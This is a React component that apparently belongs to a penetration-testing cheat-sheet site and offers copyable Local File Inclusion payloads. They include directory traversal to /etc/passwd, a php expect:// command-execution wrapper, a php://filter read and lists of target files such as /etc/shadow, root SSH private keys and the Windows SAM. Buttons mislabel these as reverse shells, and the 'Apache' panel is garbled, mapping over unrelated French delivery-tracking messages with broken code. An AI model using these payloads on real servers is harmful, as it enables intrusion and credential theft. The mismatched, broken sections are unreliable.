import React from "react";
import { Button, message, Typography, Divider, Collapse } from "antd";
import {
  CopyOutlined,
  LinkOutlined,
  createFromIconfontCN,
} from "@ant-design/icons";
import QueueAnim from "rc-queue-anim";
import Clipboard from "react-clipboard.js";

const { Title, Paragraph } = Typography;
const { Panel } = Collapse;
const IconFont = createFromIconfontCN({
  scriptUrl: ["./iconfont.js"],
});

export default (props) => {
  const successInfoReverseShell = () => {
    message.success("Your LFI payload has been copied");
  };
  const successInfoEncodeURL = () => {
    message.success("Your LFI payload URL encoded has been copied");
  };
  const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
  const phpWrapperLfi = `/example1.php?page=expect://ls`;
  const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
  const linux = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/issue",
    "/etc/group",
    "/etc/hostname",
    "/etc/ssh/ssh_config",
    "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    "/home/user/.ssh/authorized_keys",
    "/home/user/.ssh/id_rsa",
  ];
  const items = [
    {
      title: "Jean célestin a accepter votre commande",
      time: "Le 12 Mars 2020 à 19h30",
      icon: "uil uil-check-circle",
      check: "uil uil-check",
      class: "successCard",
    },
    {
      title: "Jean célestin est dans le magasin",
      time: "Le 12 Mars 2020 à 19h38",
      icon: "uil uil-shop",
      check: "uil uil-check",
      class: "successCard",
    },

    {
      title: "Jean célestin vous as envoyé le ticket de caisse",
      time: "Le 12 Mars 2020 à 19h44",
      icon: "uil uil-qrcode-scan",
      check: "uil uil-times",
      class: "dangerCard",
    },
    {
      title: "Jean célestin est en chemin vers votre domicile",
      time: "Le 12 Mars 2020 à 19h45",
      icon: "uil uil-car",
      check: "uil uil-times",
      class: "dangerCard",
    },
  ];
  const mysql = [
    "/var/lib/mysql/mysql/user.frm",
    "/var/lib/mysql/mysql/user.MYD",
    "/var/lib/mysql/mysql/user.MYI",
  ];
  const windows = [
    "/boot.ini",
    "/autoexec.bat",
    "/windows/system32/drivers/etc/hosts",
    "/windows/repair/SAM",
    "/windows/panther/unattended.xml",
    "/windows/panther/unattend/unattended.xml",
  ];

  return (
    <QueueAnim delay={300} duration={1500}>
      <Title
        variant='Title level={3}'
        style={{ fontWeight: "bold", margin: 15 }}
      >
        LFI
      </Title>
      <Paragraph style={{ margin: 15 }}>
        LFI stands for Local File Includes - it’s a file local inclusion
        vulnerability that allows an attacker to include files that exist on the
        target web server.
      </Paragraph>
      <Paragraph>
        Typically this is exploited by abusing dynamic file inclusion mechanisms
        that don’t sanitize user input.
      </Paragraph>
      <Divider dashed />
      <div style={{ padding: 10, marginTop: 15 }} key='a'>
        <Title level={3}>Directory traversal</Title>
        <Paragraph copyable ellipsis={true}>
          {directoryTraversal}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={directoryTraversal}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined /> Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard
          component='a'
          data-clipboard-text={encodeURI(directoryTraversal)}
        >
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='b'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>PHP Wrapper php://file</Title>
        <Paragraph copyable ellipsis={true}>
          {phpWrapperLfi}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={phpWrapperLfi}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(phpWrapperLfi)}>
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='c'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>PHP Wrapper php://filter</Title>
        <Paragraph copyable ellipsis={true}>
          {phpWrapperFilter}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={phpWrapperFilter}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard
          component='a'
          data-clipboard-text={encodeURI(phpWrapperFilter)}
        >
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='d'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>Useful LFI files</Title>
        <Collapse defaultActiveKey={["0"]}>
          <Panel header='Linux' key='1'>
            <Paragraph copyable>{linux}</Paragraph>
          </Panel>
          <Panel header='Apache' key='2'>
            {items.map((i, f) => {
              return (
                <div key={i}>
                  <Paragraph copyable>{f.title}</Paragraph>
                </div>
              );
            })}
          </Panel>
          <Panel header='MySql' key='3'>
            <Paragraph copyable>{mysql}</Paragraph>
          </Panel>
          <Panel header='Windows' key='4'>
            <Paragraph copyable>{windows}</Paragraph>
          </Panel>
        </Collapse>
      </div>
      <Divider dashed />
    </QueueAnim>
  );
};
